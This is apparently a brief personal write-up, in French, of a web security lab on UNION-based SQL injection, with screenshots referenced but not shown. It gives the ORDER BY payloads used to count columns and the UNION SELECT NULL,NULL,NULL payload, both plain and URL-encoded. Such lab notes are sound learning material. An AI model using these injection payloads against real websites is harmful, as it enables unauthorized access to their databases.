 
![](Pasted%20image%2020260722155540.png)
pour résoudre ce lab, on doit utiliser une injection SQL avc UNION pour voir les réponses des autres tables, et pour ça faut déterminer le nombre de colums qu'il y a dans la db , on va d'abord voir combien il y a de columns avc ORDER BY 

'  ORDER BY  1--    jusqu'à ce qu'il affiche une erreur qui dit qu'il n'y a plus d'autres columns 
'+ORDER+BY+1--
ainsi de suite 

![](Pasted%20image%2020260722155612.png)
on peut voir qu'on a reçu une erreur à la 4, donc on a que 3 columns donc on va use un UNION

' UNION SELECT NULL--
mais vu que c 3 columns on va use 3 fois NULL
' UNION SELECT NULL,NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--

![](Pasted%20image%2020260722155629.png)

![](Pasted%20image%2020260722155651.png)
